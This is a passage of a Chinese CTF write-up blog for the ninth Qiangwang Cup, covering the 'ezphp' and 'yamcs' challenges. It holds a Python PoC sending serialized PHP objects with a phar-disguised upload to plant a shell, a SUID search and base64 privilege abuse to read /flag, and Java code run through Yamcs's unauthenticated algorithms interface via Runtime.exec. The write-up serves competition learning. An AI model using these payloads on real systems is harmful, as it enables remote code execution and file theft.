class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;种子seed为：&quot;</span> . <span class="variable">$seed</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前时间time为：<span class="number">1530</span></span><br><span class="line">找到合适的字符串！</span><br><span class="line">生成的字符串为：pharzxif</span><br><span class="line">种子seed为：<span class="number">1530786234</span></span><br></pre></td></tr></table></figure>

<p>所以我们设置readflag为786234的话就可以将文件名设置为phar后缀的</p>
<p>最后别忘了需要绕过wakeup</p>
<p>整合一下可以得到poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://localhost:8000&quot;</span></span><br><span class="line">poc1 = <span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;786234&quot;;s:1:&quot;f&quot;;s:4:&quot;test&quot;;s:3:&quot;key&quot;;s:5:&quot;class&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">poc2 = <span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;786234&quot;;s:1:&quot;f&quot;;s:55:&quot;\0readflag/var/www/html/index.php(1) : eval()\&#x27;d code:1$1&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;a:2:&#123;i:0;&#x27;</span> + poc1 + <span class="string">&#x27;i:1;&#x27;</span> + poc2 + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;land&#x27;</span> : exp</span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> : (<span class="string">&#x27;1.png&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;1.gz&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(target, params=data,files=file)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>写shell上去后还需要提权</p>
<p>看一下SUID位文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>找到一个base64，直接用base64读文件就行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/flag&quot;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure>

<p>至于为什么只需要文件名中包含phar就能反序列化可以看这个wp</p>
<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-12">https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-12</a></p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022154604315.png" alt="image-20251022154604315"></p>
<h2 id="yamcs"><a href="#yamcs" class="headerlink" title="yamcs"></a>yamcs</h2><p>附件给了一个dockerfile</p>
<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> maven:<span class="number">3.9</span>.<span class="number">9</span>-eclipse-temurin-<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /build</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y git &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/yamcs/quickstart.git</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /build/quickstart</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x mvnw</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> ./mvnw compile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y python3 python3-pip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get clean</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> ./mvnw dependency:go-offline</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> FLAG&gt;/flag</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8090</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> bash -c <span class="string">&#x27;\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  nohup python3 simulator.py &gt;/dev/null 2&gt;&amp;1 &amp; \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  ./mvnw yamcs:run&#x27;</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打开题目扫目录找到一个api接口</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;yamcsVersion&quot;: &quot;5.12.0&quot;,</span><br><span class="line">  &quot;serverId&quot;: &quot;engine-1&quot;,</span><br><span class="line">  &quot;defaultYamcsInstance&quot;: &quot;myproject&quot;,</span><br><span class="line">  &quot;plugins&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;yamcs-web&quot;,</span><br><span class="line">    &quot;description&quot;: &quot;Web UI for managing and monitoring Yamcs&quot;,</span><br><span class="line">    &quot;version&quot;: &quot;5.12.0&quot;,</span><br><span class="line">    &quot;vendor&quot;: &quot;Space Applications Services&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;revision&quot;: &quot;b6a0f04a4eb3a7af870d4d25422c33ffa870d3fb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;auth接口</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;requireAuthentication&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个认证登录的配置</p>
<p>在环境中百无聊赖的逛了半天，在algorithms下找到一个可以运行代码的口子，并且还没什么过滤</p>
<p>在 Yamcs 中，**<code>algorithms</code><strong>是一种用于进行</strong>实时处理、计算或派生新参数**的接口</p>
<p>直接传就行</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">  <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">  java.io.<span class="type">InputStream</span> <span class="variable">inputStream</span>  <span class="operator">=</span> process.getInputStream();</span><br><span class="line">  java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(inputStream).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">  out0.setStringValue(output);</span><br><span class="line">  s.close();</span><br><span class="line">  process.destroy();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">// 处理异常</span></span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    out0.setStringValue(<span class="string">&quot;获取内容失败&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251019145055174.png" alt="image-20251019145055174"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SecretVault"><span class="toc-number">1.</span> <span class="toc-text">SecretVault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bbjv"><span class="toc-number">2.</span> <span class="toc-text">bbjv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp%EF%BC%88%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">ezphp（赛后复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yamcs"><span class="toc-number">4.</span> <span class="toc-text">yamcs</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&text=第九届强网杯wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&is_video=false&description=第九届强网杯wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=第九届强网杯wp&body=Check out this article: https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&title=第九届强网杯wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&name=第九届强网杯wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/10/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/&t=第九届强网杯wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
